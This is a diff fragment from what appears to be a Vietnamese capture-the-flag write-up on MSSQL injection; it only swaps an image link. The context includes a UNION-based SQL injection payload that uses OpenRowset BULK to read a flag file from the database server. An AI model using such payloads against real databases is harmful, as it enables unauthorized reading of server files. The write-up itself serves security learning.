@@ -134,7 +134,7 @@ Research một tí, mình tìm được cách đọc file trong MSSQL bằng cá
 
 Cơ mà văn vở vậy thôi, sau khi mình biết nó là **MSSQL** mình đã bay ngay vào [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md) để tìm payload cho nhanh rồi
 
-![](https://i.imgur.com/QyXtJR3.png)
+![](https://i.imgur.com/EJJTJxd.png)
 
 ```sql
 0'union select 0,(select x from OpenRowset(BULK '/tmp/FLAG_DBSERVER',SINGLE_CLOB) R(x)),2;--
